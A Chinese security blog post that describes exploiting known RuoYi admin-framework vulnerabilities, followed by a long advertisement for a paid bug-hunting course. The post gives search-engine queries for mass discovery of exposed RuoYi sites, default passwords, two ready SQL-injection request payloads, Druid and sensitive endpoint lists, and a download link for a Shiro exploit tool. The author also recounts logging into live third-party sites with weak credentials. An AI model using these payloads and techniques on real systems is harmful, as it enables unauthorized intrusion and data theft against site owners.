#  针对若依系统nday的常见各种姿势利用  
 Say Sec   2026-01-23 01:02  
  
扫码加圈子  
  
获内部资料  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=png&wxfrom=13&wx_lazy=1&wx_co=1&tp=wxpic "")  
  
  
#   
  
专注于SRC漏洞挖掘、红蓝对抗、渗透测试、代码审计JS逆向，CNVD和EDUSRC漏洞挖掘，以及工具分享、前沿信息分享、POC、EXP分享。不定期分享各种好玩的项目及好用的工具，欢迎关注。加内部圈子，文末有彩蛋（知识星球优惠卷）。  
#   
  
  
01  
  
0x1   
针对若依系统nday的常见各种姿势利用  
  
## 0x1 前言  
  
这篇文章也是在前几天跟着我几个厉害的师傅一起学习学的多种nday的打法，然后自己也是花了很多的时间在网上找相关若依系统的nday打法，然后自己利用FOFA和鹰图进行资产收集，然后进行渗透测试各个站点，然后把若依常见的姿势打出来给师傅们分享下！  
## 0x2 若依系统简介  
  
Ruoyi（若依）  
是一款基于Spring Boot  
和Vue.js  
开发的快速开发平台。它提供了许多常见的后台管理系统所需的功能和组件，包括权限管理、定时任务、代码生成、日志管理等。Ruoyi的目标是帮助开发者快速搭建后台管理系统，提高开发效率。  
  
若依有很多版本，其中使用最多的是Ruoyi  
单应用版本（RuoYi），Ruoyi前后端分离版本（RuoYi-Vue），Ruoyi微服务版本（RuoYi-Cloud），Ruoyi移动版本（RuoYi-App）。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1T2PqPP9L01rwyZpUQrxrsmMYVmos6xUJJCYSg07QhK518Bb547S1hw/640?wx_fmt=png&from=appmsg "null")  
### 配合ruoyi的服务  
```
alibaba druidalibaba nacosspringredismysqlminiofastjsonshiroswagger-ui.htmlmybatis
```  
## 0x3 信息收集/资产收集  
### 浅谈  
  
对于我们在渗透测试以及挖src的过程中，其实最先开始的信息收集以及对目标资产的资产收集是最重要的一个环节。这次带师傅们来对我们这次若依系统的一个资产收集，常见的资产收集的话就是直接使用一些安全空间引擎，比如常用的FOFA、鹰图等，还有就是一些企业查询的，比如爱企查、企查查等，然后使用里面的检索语法去做一个信息收集。  
### 拓展  
  
首先给师傅们看下若依系统最经典的加载界面，就是这样的一个加载页面，其实见多了的师傅会发现这个若依系统的加载界面其实和blade的加载界面很像的  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1joj4OgC33P4UuQnzJPgCLZnS20jtNEoZN45KPMssdr6Xnt9VeahxibA/640?wx_fmt=png&from=appmsg "null")  
  
blade登录后台网站特征  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI12k7Itu6rD8Z35ltDCxhvwpzQ81JgLr7DRfnic6UxNI2xLbicEdQva4ag/640?wx_fmt=png&from=appmsg "null")  
### FOFA  
  
下面这个绿色的小草就是若依的icon图标，然后就可以拿这个直接去FOFA检索了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1z15tVMPcT46THSIf69qG1NiaZt4qUaROFyf6jicsuSm9bb8ASLyX9zyg/640?wx_fmt=png&from=appmsg "null")  
  
FOFA检索语法如下：  
```
(icon_hash="-1231872293" || icon_hash="706913071")
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1lPE4mibodJdIrlTvXRn2eQsyFGSujkYcWXrDcmqtKRuTic5zFS6Zjh5Q/640?wx_fmt=png&from=appmsg "null")  
  
然后可以看到其实是有两种颜色的小草icon图标的，都是常见的若依系统  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1Zs06SadvfxVuTKknXI4oEm1mRkur8V0sC3wz3l8UWibibIcPLCrP7SdQ/640?wx_fmt=png&from=appmsg "null")  
  
可以看到这里利用上面的语法可以检索出来差不多七万多条独立的IP数，其实不止这些，像很多网站都魔改，然后比如icon图标都会修改  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1SeFA7xl36XYhFovaEmbvxphdx8wHlPnJnEV5owwhVeyAxlaaDbXr5g/640?wx_fmt=png&from=appmsg "null")  
### 鹰图  
  
鹰图的检索语法如下：  
```
web.body="若依后台管理系统"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1hkINiawibmVibaaT3cW7TvPtHpIds7WsYQb4ojicibVAUkDgpTsiaMagOkZA/640?wx_fmt=png&from=appmsg "null")  
## 0x4 若依系统打nday  
### 漏洞一：弱口令漏洞  
  
下面是常见的若依系统的弱口令，但是其中我碰到的若依弱口令都是admin:admin123、ry:admin123这两套账号密码，要是弱口令尝试不出来就撤吧了，因为若依的前端漏洞特别少  
```
用户：admin ruoyi druid
密码：123456 admin druid admin123 admin888
```  
  
这里直接就是弱口令登录进去了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1f5oqFCicB50C9D1Y2iazrEdcqKuz1c9y2pxPJ1gjENicaO3d23RnCcyyA/640?wx_fmt=png&from=appmsg "null")  
### 漏洞二：SQL注入漏洞  
  
都是POST请求方式  
  
**注入点一：：**  
 在/system/role/list接口的params  
[  
dataScope]参数  
  
**POC如下：**  
```
POST /system/role/list HTTP/1.1Host: Content-Length: 179sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"Accept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestsec-ch-ua-mobile: ?0User-Agent: Cookie: Connection: closepageSize=&pageNum=&orderByColumn=&isAsc=&roleName=&roleKey=&status=&params[beginTime]=&params[endTime]=&params[dataScope]=and extractvalue(1,concat(0x7e,(select database()),0x7e)
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1glzlGxTB6Q2pysm3PPg206cELAn5wwmpt3NCmqia3cicpTfuePe1rdYA/640?wx_fmt=png&from=appmsg "null")  
  
**注入点二：**  
/system/dept/edit    ancestors参数存在SQL漏洞  
  
RuoYi  v4.6版本  
  
**POC 如下：**  
```
POST /system/dept/edit HTTP/1.1Host: Content-Length: 179sec-ch-ua: "Chromium";v="109", "Not_A Brand";v="99"Accept: application/json, text/javascript, */*; q=0.01Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestsec-ch-ua-mobile: ?0User-Agent: Cookie: Connection: closeDeptName=1&deptid=100&ParentId=12&Status=0&ordernum=1&ancestors=0)or(extractvalue(1,concat((select user()))));#
```  
  
其中最简单的测试方式就是直接把url以及cookie值拿到若依工具去检测  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI10Uanb4owThGLjIYfA6LSoRxJqDfV4yspkpJ5wgsacE02ppwLK7gpaQ/640?wx_fmt=png&from=appmsg "null")  
  
这里需要注意的是这个小饼干插件，新版本的若依系统的cookie值是Admin-Token值且是JWT编码的，右边的是老版本的，就是jsessionid值  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1K1YIwEYITh8ZsNq7ibOBynicaibFPMVs1LHhRh31tM3mH8icwNJib2tXwkg/640?wx_fmt=png&from=appmsg "null")  
### 漏洞三：druid页面渗透  
  
可以看到bp数据包里面有很多的/prod-api接口，其实看若依系统多的师傅们都这到这个接口就是若依框架的常见的一个关键字接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1KHPpVIsVgDfy2Zcmc0lNW6xa8P684wKcFxlqZs0PTVJlWgkx0EzHTA/640?wx_fmt=png&from=appmsg "null")  
  
**druid常见访问路径：**  
```
/druid/index.html/druid/login.html/prod-api/druid/login.html/prod-api/druid/index.html/dev-api/druid/login.html/dev-api/druid/index.html/api/druid/login.html/api/druid/index.html/admin/druid/login.html/admin-api/druid/login.html
```  
  
直接访问这个常用的路径，直接爆出来了druid的登录后台的页面，这样我们就是可以尝试使用弱口令登录，或者通过bp抓包然后进行账号密码爆破，账号一般是admin  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1eJEt6UPVYFeUdfdiaiaaGPTRiaYCzPibjhH0MPnFGibKCePrW4h0WjVYIibA/640?wx_fmt=png&from=appmsg "null")  
  
下面就直接利用弱口令登录成功了，然后后面就可以尝试打下druid的nday漏洞了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1GIhayF9OcHQdvWeq7Zc9XtkSjiactTYmujIT6vtfW99Cia3gy71HNC2g/640?wx_fmt=png&from=appmsg "null")  
  
可以看到在URL监控里面泄露了很多的敏感信息接口  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1cQ0mhcLtSUyMnUG6azP7InNtABMukZter7icUgq4GE2Xkky9ImNcTwQ/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1icvIfu82rFicULhnQc3Zt0ZswAVwibKT4mo9MmM7vK1CW4o5gn1wB3NVQ/640?wx_fmt=png&from=appmsg "null")  
  
然后还可以使用swag  
ger插件进行信息泄露的利用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1eNFYaJmQuMEl1xfyevSoBIoJ2NkbkhfzwKYUAd1RJL9CDkNAb5rqrg/640?wx_fmt=png&from=appmsg "null")  
### 漏洞四：默认shiro key命令执行漏洞  
  
直接使用Liqunkit工具梭哈，目前github上的Liqunkit工具都被下架了，下面是直接使用百度网盘分享下这个工具  
```
链接：https://pan.baidu.com/s/1SzyVpnFvP0Qfp1Z1stpyug提取码：1tyl--是否有后门自行测试
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1GHEBWbmSzs2Vqcmu7qTCcenA26nK1vKH7grwjJvZqiavSwlLl6nX50g/640?wx_fmt=png&from=appmsg "null")  
### 漏洞五：弱口令+历史漏洞结合  
  
下面这个网站我是直接访问，然后页面自动显示了账号密码的，账号是admin，但是密码加密了，但是懂点语言相关的师傅们都知道，这个直接在源代码里面，把password改成别的或者直接删掉就可以回显密码了  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI18fCNA9W3NvQ8NEkicOtp46icPgpKBfxg3OibQq4zconshaunBbh5icl6ow/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI19chOW2ZW6SdM80rEjaE1gS64bAL7SiatbSQnwvEjbJWxutdAgzcvzvQ/640?wx_fmt=png&from=appmsg "null")  
  
直接改下password参数，然后就可以看到密码了，然后直接登录后台  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1vCG4FsczH8N1SzGk6qkMGSCVFZzDrnRiaP7NhvUdSOd6ibV6u93I9jVw/640?wx_fmt=png&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI14LhEm1BZ3zohMzHKESj3siaJUBKpibuzZDDdnq7wZJbGHzJKNLNcu0pA/640?wx_fmt=png&from=appmsg "null")  
  
然后我再利用鹰图去测试下源代码里面的特殊关键字，看看跟这个站点一样的网站还有没有，  
  
利用鹰图检索出来了蛮多的网站，但是独立的IP数量就只有两个  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1l54aLRkM4mCxKNO9Eer4sBnAjaFKALQbTkfoSNFjEGsPialuAicbsmjQ/640?wx_fmt=png&from=appmsg "null")  
  
使用admin:admin123再拿别的网站测试，发现利用同样的手法也都是可以登录成的  
  
这个主要是给师傅们分享下打站点的思路，这个站点的通杀手法没什么特别大价值，但是思路很重要。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI15qmqynQLON564Ftc05C9Jmbj0BMhhZPX0iaBqH7zJQ1AzQQBCs2keyg/640?wx_fmt=png&from=appmsg "null")  
### 漏洞六：Spring-Boot漏洞  
  
师傅们可以看到下面这个站点哈，说是若依的系统，但是没有任何的若依的特征，像碰到这样的站点，师傅们该怎么去测试呢？  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI18ht8OkYYvaFtqglyynEyxqhAP5sFI0jqyGA1HeXQKCa2zT73usp3xw/640?wx_fmt=png&from=appmsg "null")  
  
下面就给师傅们分享下思路，我们可以使用若依的常见的路径，然后进行一个路径的拼接  
  
**常见访问路径：**  
```
/druid/index.html/druid/login.html/prod-api/druid/login.html/prod-api/druid/index.html/dev-api/druid/login.html/dev-api/druid/index.html/api/druid/login.html/api/druid/index.html/admin/druid/login.html/admin-api/druid/login.html
```  
  
拼接路径成功后，可以看到下面的页面回显的不就是经典的spring-boot报错页面嘛  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1XicTQqMuG45A2JnMKnyPXh1f9wZ4Hj3Woy9XfFq4ahWpdrDKiaCSgibvw/640?wx_fmt=png&from=appmsg "null")  
  
然后就可以使用曾哥的spring-boot 工具扫描下，然后看看泄露的信息有什么，  
  
扫描结果显示确实存在spring-boot框架漏洞，后面的就是直接去访问泄露的接口url了，这个不是给师傅们分享的重点，后面的信息泄露就不给师傅们拿出来了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1O8v46KHXxwOeuT4jNhXGYHlwQhQdotpwGJYReSPpGmiadm0WxoqXndA/640?wx_fmt=png&from=appmsg "null")  
## 0x5 路径拼接通杀漏洞  
  
直接  
利用FOFA或者  
鹰图去检索下面的关键字，然后看看可以打一波通杀漏洞  
```
欢迎使用RuoYi后台管理框架，当前版本：v3.8.5，请通过前端地址访问
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWU6uNbDiaFnOnN6W9QIF5FI1SHY1bnNF4hoavWF9hoTcpdaTqQFMVDMB0QUsQBJIAmVeN4icZnmednA/640?wx_fmt=png&from=appmsg "null")  
  
使用下面的账号密码登录，ruoyi:123456  
```
用户：admin ruoyi druid密码：123456 admin druid admin123
```  
  
**常见未授权访问路径：**  
```
/druid/index.html/druid/login.html/prod-api/druid/login.html/prod-api/druid/index.html/dev-api/druid/login.html/dev-api/druid/index.html/api/druid/login.html/api/druid/index.html/admin/druid/login.html/admin-api/druid/login.html
```  
  
****  
**若依敏感路径**  
：  
```
/system/duplicate/check
/system/fillRule/add
/system/fillRule/delete
/system/fillRule/deleteBatch
/system/fillRule/edit
/system/fillRule/executeRuleByCode/
/system/fillRule/exportXls
/system/fillRule/importExcel
/system/fillRule/list
/system/fillRule/testFillRule
/system/gatewayRoute/clearRedis
/system/gatewayRoute/delete
/system/gatewayRoute/list
/system/gatewayRoute/updateAll
/system/getEncryptedString
/system/log/list
/system/login
/system/loginfo
/system/logout
/system/message/systemMessage/add
/system/message/systemMessage/delete
/system/message/systemMessage/deleteBatch
/system/message/systemMessage/edit
/system/message/systemMessage/list
/system/message/systemMessageTemplate/add
/system/message/systemMessageTemplate/delete
/system/message/systemMessageTemplate/deleteBatch
/system/message/systemMessageTemplate/edit
/system/message/systemMessageTemplate/list
/system/message/systemMessageTemplate/sendMsg
/system/online/forceLogout
/system/online/list
/system/oss/file/delete
/system/oss/file/list
/system/oss/file/upload
/system/permission/add
/system/permission/addPermissionRule
/system/permission/delete
/system/systemDepartRole/deptRoleUserAdd
/system/systemDepartRole/edit
/system/systemDepartRole/getDeptRoleByUserId
/system/systemDepartRole/getDeptRoleList
/system/systemDepartRole/list
/system/systemUserAgent/add
/system/systemUserAgent/edit
/system/systemUserAgent/queryByUserName
/system/tenant/add
/system/tenant/delete
/system/tenant/deleteBatch
/system/tenant/edit
/system/tenant/list
/system/tenant/queryById
/system/tenant/queryList
/system/third/user/checkPassword
/system/third/user/create
/system/thirdApp/getEnabledType
/system/thirdApp/recallMessageTest
/system/thirdApp/sendMessageTest
/system/thirdApp/sync/dingtalk/depart
/system/thirdApp/sync/dingtalk/user
/system/thirdApp/sync/wechatEnterprise/depart
/system/thirdApp/sync/wechatEnterprise/user
/system/thirdLogin/bindingThirdPhone
/system/thirdLogin/getLoginUser/
/system/thirdLogin/oauth2/
/system/thirdLogin/render/
/system/upload/uploadMinio
/system/user/add
/system/user/addSystemUserRole
/system/user/changePassword
/system/user/checkOnlyUser
/system/user/delete
/system/user/deleteBatch
/system/user/deleteRecycleBin
/system/user/deleteUserInDepart
/system/user/deleteUserInDepartBatch
/system/user/deleteUserRole
/system/user/deleteUserRoleBatch
/system/user/departUserList
/system/user/edit
/system/user/editSystemDepartWithUser
/system/user/exportXls
/system/user/frozenBatch
/system/user/generateUserId
/system/user/getCurrentUserDeparts
/system/user/getMultiUser
/system/user/list
/system/user/passwordChange
/system/user/phoneVerification
/system/user/putRecycleBin
/system/user/queryByIds
/system/user/queryByOrgCodeForAddressList
/system/user/queryUserByDepId
/system/user/queryUserComponentData
/system/user/queryUserRole
/system/user/recycleBin
/system/user/register
```  
  
## 0x6 总结  
  
上面就是简单给师傅们介绍下若依系统的信息收集，包括主要使用FOFA和鹰图怎么去检索相关若依的漏洞。然后后面给师傅们演示了几个类型的nday的打法。主要是给师傅们分享下思路以及经验，对于若依系统的常见姿势的一个打法总结汇总，希望对师傅们有帮助哈！！！  
  
02  
  
0x2 课程背景  
  
哈咯，各位师傅们好久不见！  
神农安全内部小圈子从  
2024年开始搞起来的，到现在也已经有小一两年了，期间承蒙各位师傅们的  
关注和支持  
💗  
非常感谢大家。  
  
「神农安全」知识星球目前已经  
累计1600+网络安全爱好者的加入，在这个过程中收获到了很多师傅们的  
好评与鼓励  
🎉  
，  
内部小圈子：一个知识星球+内部小圈子交流群+知识库。一直一来价格都没有超过50（都给师傅们发优惠卷），基本上加了小圈子的师傅都会说一句——  
“  
这圈子加的真值啊  
”。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthLEynEQtMibH6uWjBva44EEEkCx8bX12KA8gsZKQlllwGfyAEiaDHqY8g/640?wx_fmt=other&from=appmsg "")  
  
我平常呢也特别的爱  
分享技术文章，特别是每当学习到一个新技术，我都会去详细认真的写一篇对应的博客文章进行发表。  
活跃于先知社区、FreeBuf、奇安信攻防社区、知乎与CSDN等技术社区，id：  
一个想当文人的黑客，累计发表   
500+篇原创技术文章。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthlexDYBvDy8LwERVHKlbb7086Gm5KFIV78taz23NJicAWpDYA9T4svTA/640?wx_fmt=png&from=appmsg "")  
  
发表的公众号文章也从来没有设置过  
付费模式，哪怕一篇文章写个一个星期左右，好几万个字一篇的文章也都向来如此。喜欢看我写文章的师傅们都知道我写的技术博客文章：要有  
实战案例截图+详细知识点汇总，所以这样也是吸引到了很多师傅们观看我的文章，也是一年时间迅速在网络安全的圈子里面发展了自己的  
内部小圈子  
（成绩也不错）  
🎉  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthuCBnAiblIbLjjYJhLFZgib8oP96fkScUILU0mYM4ZxN7m06TWhnYicsEQ/640?wx_fmt=png&from=appmsg "")  
  
后面也是小圈子做大起来了，师傅们也都喜欢看我文章，想让我开课教下思路，所以想着自己花时间做了  
 ✨  
课件和课表，都是纯自己手搓的，大家也可以看下课表的内容，再加上  
课程价格：266（小圈子师傅优惠25=241）25是知识星球续费25/年，相当于送小圈子的师傅一年知识星球的价格。  
  
不是小圈子的师傅们报名成功再送内部小圈子（知识星球）一个，都有对应的  
专属微信群聊  
 ✨  
。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthM2sjuWQFbmvWv79V058KwI0DswFF9LysewGtULj81Vp5bX9nTEK78A/640?wx_fmt=png&from=appmsg "")  
  
03  
  
0x3 课程特色  
  
课程  
主打真实，  
一线SRC漏洞挖掘师傅是如何学习和挖掘SRC漏洞的，让你真正了解SRC漏洞挖掘，助力在岗人员和大学生的能力提升，掌握新的技能树，为下一次  
跳槽涨薪做好准备。本  
课程内容覆盖企业  
SRC、众测项目挖掘、护网HVV红蓝攻防技巧、CVE、CNVD、EDUSRC等平台通杀案例技巧挖掘方法。  
  
本课程  
适合人群  
（光看不挖啥也不会）  
```
1、想从0转行入行的大学生或自学者
2、想从CTF比赛/Web或SRC进阶到项目实战的选手
3、想参与项目/找工作/提高收入的转型者
```  
  
课程价格：266元  
  
加入小圈子的师傅们  
直接减25元=241元  
，报课成功的师傅们直接免费送内部小圈：一个知识星球+内部小圈子交流群  
```
1、课程价格真心实惠，绝不割韭菜
2、两三百的课程价格让你体会大几千的培训课程内容
3、带着大家从0到1，本人上课坚持手搓课件（实战案例+知识体系）
4、拒绝使用PPT演讲模式（无实操，很枯燥）
```  
  
直播培训教学方式  
  
课程  
一周1-2节课，课程特色涵盖直播多人上麦活跃回答，直播过程中有问题随时解决或私信我。  
拉微信群：一个知识星球内部小圈子交流群+课程培训直播通知群。有项目/工作/护网第一时间内推报课的师傅，  
一对一简历优化，助力在岗人员和大学生的能力提升。  
  
一次报名每期均可永久学习，并且赠送内部「神农安全」知识星球，一对一永久解答、无保留教学！  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
课程均为线上交付，报名成功后  
不支持退款  
  
内部小圈子  
（知识星球+内部小圈子交流群+知识库）  
  
对内部小圈子感兴趣的师傅们也可以看下下面的这个  
跳转链接，里面有对小圈子的详细介绍，报名课程成功的师傅们直接免费送一个（直接点击下面直接可以跳转）。  
  
[强烈推荐一个永久的SRC挖掘、渗透攻防内部知识库](https://mp.weixin.qq.com/s?__biz=Mzk0Mzc1MTI2Nw==&mid=2247501608&idx=1&sn=5eb836122ac222ca9767a7bbc3c4521b&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltth4VWMmSt5ZBYAUuNNGuEjU3tvKRAN0yqMTPSnzKxibReCfiaFGibLxdAYw/640?wx_fmt=png&from=appmsg "")  
  
讲师介绍  
  
id：一个想当文人的黑客  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXNmpV89Zxcm1J56eeHltthqvGuVSjkR43eeaNibf1KbGU4nia5ibXFYpTBFeAbQewTq43IqJHIMhhhg/640?wx_fmt=png&from=appmsg "")  
  
欢迎关注微信公众号：神农Sec，报名咨询添加微信：  
routing_love  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWXLicr9MthUBGib1nvDibDT4r6iaK4cQvn56iako5nUwJ9MGiaXFdhNMurGdFLqbD9Rs3QxGrHTAsWKmc1w/640?wx_fmt=jpeg&from=appmsg "")  
  
04  
  
0x4   
第一期挖洞培训课表内容  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWVMibw6HiaoHUxJgNHUVfqCicbGSauW0QQBjLcC9H4gdOEyW3ZzLjTfyYibqGdaSueO9GDbbyicmckia2Kg/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**内部圈子介绍（报课赠送）**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
**圈子专注于更新src/红蓝攻防相关：**  
  
```
1、维护更新src专项漏洞知识库，包含原理、挖掘技巧、实战案例
2、知识星球专属微信“小圈子交流群”
3、微信小群一起挖洞
4、内部团队专属EDUSRC证书站漏洞报告
5、分享src优质视频课程（企业src/EDUSRC/红蓝队攻防）
6、分享src挖掘技巧tips
7、不定期有众测、渗透测试项目（一起挣钱）
8、不定期有工作招聘内推（工作/护网内推）
9、送全国职业技能大赛环境+WP解析（比赛拿奖）
10、十个专栏会持续更新~提前续费有优惠，好用不贵很实惠
11、每日内部资料分享，内部圈子资料1000+
12、联系圈主获取：内部漏洞知识库+圈子使用手册+内部圈子交流群
13、VX：routing_love，技术交流+疑问解决
```  
  
  
**内部圈子**  
**专栏介绍**  
  
知识星球内部共享资料截屏详情如下  
  
（只要没有特殊情况，每天都保持更新）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=other&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
**知识星球——**  
**神农安全**  
  
**知识库部分大纲目录如下：**  
  
知识库跟  
知识星球联动，基本上每天保持  
更新，满足圈友的需求  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
知识库和知识星球有师傅们关注的  
EDUSRC  
和  
CNVD相关内容（内部资料）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=other&from=appmsg "")  
  
  
还有网上流出来的各种  
SRC/CTF等课程视频  
  
量大管饱，扫描下面的知识星球二维码加入即可  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
不会挖CNVD？不会挖EDURC？不会挖企业SRC？不会打nday和通杀漏洞？  
  
直接加入我们小圈子：  
知识星球+内部圈子交流群+知识库  
  
快来吧！！  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
神农安全知识库内部配置很多  
内部工具和资料💾，  
玄机靶场邀请码+EDUSRC邀请码等等  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
快要护网来临，是不是需要  
护网面试题汇总  
？  
问题+答案（超级详细🔎）  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
最后，师傅们也是希望找个  
好工作，那么常见的  
